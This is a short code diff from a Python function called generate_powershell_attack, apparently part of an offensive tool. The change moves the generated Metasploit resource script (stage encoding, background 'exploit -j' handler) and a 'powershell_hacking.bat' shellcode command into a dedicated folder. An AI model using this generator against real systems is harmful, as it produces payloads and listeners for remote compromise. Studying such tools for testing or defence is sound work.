@@ -139,11 +139,16 @@ def generate_powershell_attack(payload, host, port):
                   "set EnableStageEncoding true\n"
                   "exploit -j\n") % (payload, host, port)
 
+    ps_dirname = "powershell_attack"
+    ps_msf_filename = "powershell_msf.rc"
+    ps_script_filename = "powershell_hacking.bat"
+
+    if not os.path.isdir(ps_dirname): os.makedirs(ps_dirname)
     logging.info('create msfconsole resource script')
-    write_file('powershell_msf.rc', msfcommand)
+    write_file("%s/%s" % (ps_dirname, ps_msf_filename), msfcommand)
 
     logging.info('create powershell shellcode command')
-    write_file('powershell_hacking.bat', powershell_cmd)
+    write_file("%s/%s" % (ps_dirname, ps_script_filename), powershell_cmd)
 
     return powershell_cmd, msfcommand
 
